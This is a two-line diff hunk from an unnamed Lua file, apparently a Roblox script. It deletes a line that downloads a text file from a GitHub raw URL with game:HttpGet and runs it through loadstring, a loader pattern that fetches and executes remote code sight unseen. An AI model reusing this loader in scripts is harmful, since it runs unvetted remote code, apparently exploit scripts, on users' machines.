@@ -1,2 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lol8267vr/V6/main/message-2.txt"))()
-
